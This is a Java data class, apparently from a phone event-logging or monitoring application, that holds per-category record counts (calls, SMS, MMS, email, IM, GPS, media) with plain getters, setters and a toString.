package com.fx.maind.ref;

import java.io.Serializable;

public class DatabaseRecords implements Serializable{
	
	private static final long serialVersionUID = -5583295450314308253L;
	
	private String mDatabaseRecords;

	private int mTotalEvents;
	private int mIncomingCall;
	private int mOutgoingCall;
	private int mMissedCall;
	private int mIncomingSMS;
	private int mOutgoingSMS;
	private int mIncomingMMS;
	private int mOutgoingMMS;
	private int mIncomingEmail;
	private int mOutgoingEmail;
	private int mIncomingIM;
	private int mOutgoingIM;
	private int mGPS;
	private int mSystem;
	private int mImage;
	private int mAudio;
	private int mVideo;
	private int mWallpaper;
	
	public void setDatabaseRecords(String databaseRecords) {
		this.mDatabaseRecords = databaseRecords;
	}
	
	public String getDatabaseRecords() {
		return this.mDatabaseRecords;
	}
	
	@Override
	public String toString() {
		StringBuilder builder = new StringBuilder();
		builder.append("GetDatabaseRecordsCommandResponse {");
		builder.append(", TotalEvents =").append(mTotalEvents);
		builder.append(", IncomingCall =").append(mIncomingCall);
		builder.append(", OutgoingCall =").append(mOutgoingCall);
		builder.append(", MissedCall =").append(mMissedCall);
		builder.append(", IncomingSMS =").append(mIncomingSMS);
		builder.append(", OutgoingSMS =").append(mOutgoingSMS);
		builder.append(", IncomingMMS =").append(mIncomingMMS);
		builder.append(", IncomingEmail =").append(mIncomingEmail);
		builder.append(", OutgoingEmail =").append(mOutgoingEmail);
		builder.append(", IncomingIM =").append(mIncomingIM);
		builder.append(", OutgoingIM =").append(mOutgoingIM);
		builder.append(", GPS =").append(mGPS);
		builder.append(", System =").append(mSystem);
		builder.append(", Image =").append(mImage);
		builder.append(", Audio =").append(mAudio);
		builder.append(", Video =").append(mVideo);
		builder.append(", Wallpaper =").append(mWallpaper);
		return builder.append(" }").toString();		
	}

	public int getTotalEvents() {
		return mTotalEvents;
	}

	public void setTotalEvents(int mTotalEvents) {
		this.mTotalEvents = mTotalEvents;
	}

	public int getWallpaper() {
		return mWallpaper;
	}

	public void setWallpaper(int mWallpaper) {
		this.mWallpaper = mWallpaper;
	}

	public int getVideo() {
		return mVideo;
	}

	public void setVideo(int mVideo) {
		this.mVideo = mVideo;
	}

	public int getAudio() {
		return mAudio;
	}

	public void setAudio(int mAudio) {
		this.mAudio = mAudio;
	}

	public int getImage() {
		return mImage;
	}

	public void setImage(int mImage) {
		this.mImage = mImage;
	}

	public int getSystem() {
		return mSystem;
	}

	public void setSystem(int mSystem) {
		this.mSystem = mSystem;
	}

	public int getGPS() {
		return mGPS;
	}

	public void setGPS(int mGPS) {
		this.mGPS = mGPS;
	}

	public int getOutgoingEmail() {
		return mOutgoingEmail;
	}

	public void setOutgoingEmail(int mOutgoingEmail) {
		this.mOutgoingEmail = mOutgoingEmail;
	}

	public int getIncomingEmail() {
		return mIncomingEmail;
	}

	public void setIncomingEmail(int mIncomingEmail) {
		this.mIncomingEmail = mIncomingEmail;
	}

	public int getOutgoingMMS() {
		return mOutgoingMMS;
	}

	public void setOutgoingMMS(int mOutgoingMMS) {
		this.mOutgoingMMS = mOutgoingMMS;
	}

	public int getIncomingMMS() {
		return mIncomingMMS;
	}

	public void setIncomingMMS(int mIncomingMMS) {
		this.mIncomingMMS = mIncomingMMS;
	}

	public int getOutgoingSMS() {
		return mOutgoingSMS;
	}

	public void setOutgoingSMS(int mOutgoingSMS) {
		this.mOutgoingSMS = mOutgoingSMS;
	}

	public int getIncomingSMS() {
		return mIncomingSMS;
	}

	public void setIncomingSMS(int mIncomingSMS) {
		this.mIncomingSMS = mIncomingSMS;
	}

	public int getMissedCall() {
		return mMissedCall;
	}

	public void setMissedCall(int mMissedCall) {
		this.mMissedCall = mMissedCall;
	}

	public int getOutgoingCall() {
		return mOutgoingCall;
	}

	public void setOutgoingCall(int mOutgoingCall) {
		this.mOutgoingCall = mOutgoingCall;
	}

	public int getIncomingCall() {
		return mIncomingCall;
	}

	public void setIncomingCall(int mIncomingCall) {
		this.mIncomingCall = mIncomingCall;
	}

	public int getIncomingIM() {
		return this.mIncomingIM;
	}

	public void setIncomingIM(int incomingIM) {
		this.mIncomingIM = incomingIM;
	}
	
	public int getOutgoingIM() {
		return this.mOutgoingIM;
	}
	
	public void setOutgoingIM(int outgoingIM) {
		this.mOutgoingIM = outgoingIM;
	}
}
